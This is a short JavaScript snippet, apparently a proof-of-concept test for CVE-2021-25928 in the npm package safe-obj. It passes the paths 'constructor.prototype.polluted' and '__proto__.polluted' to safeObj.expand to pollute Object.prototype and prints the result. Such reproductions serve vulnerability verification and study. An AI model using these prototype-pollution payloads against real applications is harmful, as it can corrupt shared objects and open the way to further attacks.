// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

// test("prototype pollution in safeObj", () => {
  var safeObj = require("safe-obj");
  obj = {};

console.log({}.polluted);
safeObj.expand(obj, "constructor.prototype.polluted", "yes");
  //safeObj.expand(obj, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
